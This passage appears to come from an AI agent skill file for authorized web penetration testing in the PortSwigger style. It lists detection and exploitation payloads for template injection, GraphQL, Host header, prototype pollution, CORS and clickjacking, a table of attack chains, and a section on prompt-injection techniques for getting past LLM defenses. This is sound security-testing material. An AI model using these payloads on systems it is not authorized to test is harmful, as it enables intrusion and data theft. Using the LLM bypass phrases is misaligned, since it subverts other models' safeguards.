- Leverage magic methods (`__wakeup`, `__destruct`, `__toString`, `__construct`)
- Inject arbitrary objects → available classes get instantiated regardless of expected class
- Gadget chains: pre-built chains, documented chains, custom chains
- PHP PHAR deserialization: `phar://` stream wrapper triggers deserialization

**Prevention note:** Validate integrity BEFORE deserialization begins (digital signatures, HMAC). Validation after deserialization is too late.

---

### SERVER-SIDE TEMPLATE INJECTION

**Detection — Plaintext Context:**
Inject mathematical operations: `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`. If output is `49` → SSTI confirmed.

**Detection — Code Context:**
Inject: `}}<tag>` or `}}${7*7}` to break out of expression and evaluate.

**Template Engine Identification:**
- `{{7*'7'}}` → `49` in Twig, `7777777` in Jinja2
- Invalid syntax → error message may reveal engine name and version

**Engines & Detection Payloads:**

| Engine | Detection |
|---|---|
| Twig (PHP) | `{{7*7}}` → 49 |
| Jinja2 (Python) | `{{7*'7'}}` → 7777777 |
| Freemarker (Java) | `${7*7}` |
| ERB (Ruby) | `<%= 7*7 %>` |
| Velocity (Java) | `#set($x=7*7)$x` |
| Smarty (PHP) | `{$smarty.version}` |
| Handlebars (JS) | Limited — logic-less |
| Mustache | Logic-less — low risk |

**Exploitation:**
- Read engine documentation
- Find objects exposed to templates (developer-supplied objects)
- Chain object properties to reach dangerous functions
- Common RCE paths: access `__class__`, `__mro__`, `__subclasses__()` in Python; `_self` in Twig; `java.lang.Runtime` in Java engines

---

### GRAPHQL API VULNERABILITIES

**Endpoint Discovery:**
- Test paths: `/graphql`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql`
- Universal probe: `query{__typename}` → `{"data":{"__typename":"query"}}`

**Introspection:**
```graphql
{__schema{queryType{name}mutationType{name}types{name fields{name}}}}
```

**Introspection Bypass:**
- Insert newline after `__schema`: `query{__schema\n{queryType{name}}}`
- Use GET with URL-encoded query
- Switch content type from `application/json` to `x-www-form-urlencoded`

**IDOR via GraphQL Arguments:**
```graphql
query { product(id: 3) { id name listed } }
```
Directly query objects by ID even if not listed in collection queries.

**Rate Limit Bypass via Aliases:**
```graphql
query {
  check1:isValidDiscount(code:1111){valid}
  check2:isValidDiscount(code:1112){valid}
  check3:isValidDiscount(code:1113){valid}
}
```
One HTTP request = multiple operations.

**CSRF on GraphQL:**
Vulnerable when: endpoint accepts GET, or POST with `x-www-form-urlencoded`, or `application/json` without content-type validation. Standard CSRF methodology applies.

---

### HTTP HOST HEADER ATTACKS

**Core Principle:** Host header is user-controllable; treat it as untrusted input.

**Attack Types:**
- **Password Reset Poisoning:** Supply attacker's domain in Host header → reset link in email points to attacker.
- **Web Cache Poisoning:** Cache uses Host header in cache key or response content → poison with malicious host.
- **Access Control Bypass:** Internal-only interfaces gated by Host header → supply internal hostname.
- **Virtual Host Brute-Forcing:** Single server hosts multiple sites → discover internal/development sites by supplying different Host values.
- **Routing-Based SSRF:** Intermediary uses Host header for routing → redirect requests to internal systems.
- **Connection State Attacks:** Connection reuse with conflicting Host headers → poison connection pools.

**Bypass Techniques:**

| Technique | Payload |
|---|---|
| Subdomain injection | `Host: target.com.attacker.com` |
| Port injection | `Host: target.com:evilhost` |
| Whitespace injection | `Host: target.com%20attacker.com` |
| Duplicate Host headers | Parse-conflict between front-end and back-end |
| Absolute URL in request line | `GET http://target.com/path` with different Host |

**Host Override Headers:**
`X-Forwarded-Host`, `X-Host`, `Forwarded`, `X-Forwarded-Server`. Even if Host header is validated, override headers may bypass.

---

### PROTOTYPE POLLUTION

**The Vulnerability:**
Recursive merge of user-controlled object without key sanitization. `__proto__` treated as prototype getter → properties land on `Object.prototype`.

Sources: URL query string (`?__proto__[evil]=payload`), JSON input (`JSON.parse` creates own `__proto__` property), web messages.

**Client-Side → DOM XSS Chain:**
1. Pollute `Object.prototype` with property used by application config
2. Config reads inherited property (no own property takes precedence)
3. Polluted value flows into sink (`innerHTML`, `eval`, `script.src`, `location`)

Example: `?__proto__[transport_url]=data:text/javascript,alert(1)//`

**Gadget Requirement:** Property must not exist as own property on object; object must not have null prototype.

**Bypass `__proto__` Blocking:**
`constructor.prototype` → equivalent path. Also try nested, encoded, or split key formats.

**Server-Side → RCE:**
- `child_process.fork()`: Pollute `execArgv` → pass `--eval` or `--inspect-brk` flags
- `child_process.execSync()`: Pollute `shell` → control executed command
- Status code override: Pollute `status` → force error responses
- JSON spaces override: Pollute formatting → detect pollution via whitespace changes

**Detection (Server-Side):**
Inject `"__proto__":{"testprop":"testval"}` → check if property appears in response. If no reflection, test status code override, JSON formatting changes, or charset manipulation.

---

### WEBSOCKET VULNERABILITIES

**Traffic Manipulation:**
Intercept WS messages in Burp → modify content → forward. Replay historical messages. Create entirely new messages in either direction.

**Cross-Site WebSocket Hijacking (CSWSH):**
- Handshake relies solely on cookies for auth
- No `Origin` header validation
- No CSRF token in handshake
- Attacker's page initiates cross-origin WS → browser attaches victim's cookies

**Input Injection via WebSocket:**
Any standard vuln class reachable: SQLi, XSS, XXE, command injection. Attack surface is the WS message content, not just HTTP.

**Handshake Vulnerability:** Manipulate handshake request headers (`X-Forwarded-For`, custom auth headers) before WS connection established.

---

### DOM-BASED VULNERABILITIES

**Source → Sink Flow:**
- Sources: `document.URL`, `location`, `document.cookie`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`, `history.pushState`, web messages.
- Sinks: `document.write()`, `innerHTML`, `eval()`, `Function()`, `setTimeout()` (string), `location`, `document.cookie` (write), `WebSocket()`, `script.src`, `postMessage()`, `setRequestHeader()`, `FileReader.readAsText()`.

**DOM Clobbering:**
HTML injection overwrites global JS variables via anchor elements: `<a id="globalVar">`. When app references `globalVar`, gets DOM element instead of expected value. Chain into XSS or script URL injection.

**Web Message Attacks:**
Crafted `postMessage()` from malicious iframe → vulnerable `message` event listener → missing or flawed `event.origin` check → data flows into sink.

---

### CORS MISCONFIGURATION

**Testing:**
Modify `Origin` header in any request. Check response for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`.

**Exploitable Patterns:**
- **Origin reflection:** Any `Origin` echoed in `ACAO` + `ACAC: true` → full credential-bearing data theft.
- **Whitelist bypass:** Prefix match (`target.com.evil.com`) or suffix match (`evil-target.com`). Register domain matching flawed pattern.
- **Null origin:** Server whitelists `Origin: null` with credentials. Exploit via sandboxed iframe:
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>/* XHR with withCredentials */</script>">
```
- **TLS downgrade:** HTTPS site trusts HTTP subdomain → MITM on HTTP traffic → inject CORS attack.
- **Intranet CORS:** `Access-Control-Allow-Origin: *` on internal resources → victim's browser as proxy to read intranet.

---

### CLICKJACKING

**Attack Construction:**
Transparent iframe overlaid on decoy page. CSS `opacity: 0.00001`, precise positioning, `z-index` stacking. Use Burp Clickbandit for rapid PoC.

**Variants:**
- Prefilled form inputs via GET parameters in iframe src
- Clickjacking + DOM XSS combo
- Multistep clickjacking (multiple sequential actions)

**Frame Buster Bypass:**
```html
<iframe sandbox="allow-forms" src="target.com"></iframe>
```
`allow-forms` or `allow-scripts` WITHOUT `allow-top-navigation` → frame buster can't break out.

**Detection:** Check for `X-Frame-Options` and CSP `frame-ancestors` headers. If absent or misconfigured → vulnerable.

---

### WEB LLM ATTACKS

**Prompt Injection (Direct):** Crafted user prompt manipulates LLM to perform unintended actions or violate guidelines.

**Indirect Prompt Injection:** Payload enters LLM via external source:
- Web page content → LLM summarizes → injects XSS
- Email content → LLM creates malicious forwarding rule
- Training data poisoning

**Bypass LLM Defenses:**
- Fake system messages: `***important system message: <instruction>***`
- Fake user responses: `---USER RESPONSE-- <instruction> ---USER RESPONSE--`
- Privilege escalation claims: pretend to be developer/administrator

**Excessive Agency:** Map LLM's accessible APIs → persuade it to use them unsafely. Ask LLM directly what APIs it has access to. Use LLM to execute classic web exploits against those APIs (path traversal, SQLi, SSRF).

**Insecure Output Handling:** LLM output not sanitized before reaching other components → XSS, CSRF, injection.

**Training Data Extraction:** Phrase completion, known data extrapolation, leading prompts to recover sensitive training data.

---

## CHAINING LOGIC

Always ask: **"What can I reach now?"** After finding any bug, scan for chaining opportunities:

| Finding A | Chain B | Result |
|---|---|---|
| IDOR | + Auth bypass on other endpoint | Account takeover |
| SSRF | + Cloud metadata access | AWS/GCP credential theft |
| XSS | + Victim interaction | Session theft / ATO |
| Open redirect | + OAuth callback | OAuth token theft |
| Cache deception | + Victim browsing | Session data theft |
| File upload | + Path traversal | RCE outside upload dir |
| Information disclosure | + Known CVE | Full server compromise |
| Host header injection | + Password reset | Account takeover |
| Request smuggling | + Cache poisoning | Mass victim XSS |
| Prototype pollution | + Config gadget | DOM XSS or RCE |
| SQLi | + File write (INTO OUTFILE) | Web shell / RCE |
| CSRF | + XSS (CSRF token bypass) | Full ATO |
| JWT kid injection | + Path traversal | Any-token forgery |
| OAuth redirect_uri bypass | + Open redirect on client | Code/token theft |
| Race condition | + Business logic limit | Infinite coupon/funds |
| GraphQL introspection | + IDOR via direct queries | Data enumeration |
| CORS misconfig | + Victim visit | Credential-bearing data theft |

**Chaining Mindset:**
- Low severity finding + chain = critical
- Every new piece of access (internal endpoint, admin panel, different user's data) opens new attack surface
- After gaining higher privileges, re-run the entire methodology from that new context
- Cache-based attacks multiply impact — one poisoned response can hit thousands

---

## REPORTING BEHAVIOR

When a finding is confirmed:
- **Title formula:** `[Vuln Class] in [Component] allows [Impact]`
- **Impact-first:** Lead with what an attacker can actually do. Demonstrate exploitation.
- **Reproduction steps:** Exact requests sent, payloads used, responses received.
- **Severity:** CVSS 3.1 score with vector string. Context matters — same vuln class can be low or critical.
- **Remediation:** Specific, actionable fix — not generic advice.
- **Validation proof:** Screenshots, captured responses, Collaborator interactions.
- Never use "could potentially" — prove it works or drop it.

---

## OPERATIONAL BEHAVIOR

When invoked as `/portswigger-attacks against <target>`:
1. **Assess target** — technology fingerprint, attack surface map, auth state boundaries
2. **Determine applicable vectors** — use the decision tree above; prioritize by likelihood and impact
3. **Execute methodology** — choose the most promising attack class first; go deep, not wide
4. **Iterate** — each response determines next step; build mental model of back-end
5. **Chain findings** — after any success, re-assess what's newly reachable
6. **Report** — produce detailed findings with payloads, reasoning, and exploitation paths

**Prioritization framework:**
- Critical impact + high likelihood → test FIRST
- Critical impact + low likelihood → test SECOND
- Medium impact + high likelihood → test THIRD
- Low impact + low likelihood → test LAST or skip

**Authorization:** Only operate on targets the user is authorized to test (bug bounty scope, signed engagement, owned assets, or deliberately vulnerable labs such as PortSwigger Web Security Academy). Confirm scope before active testing.

This skill works alongside the `recon-asset-discovery`, `app-analysis-testing`, and `ai-exploit-assist` skills. Use `recon-asset-discovery` for attack-surface mapping before exploitation, `app-analysis-testing` for systematic vuln testing workflow, and `ai-exploit-assist` for payload generation, exploit reasoning, and report drafting.
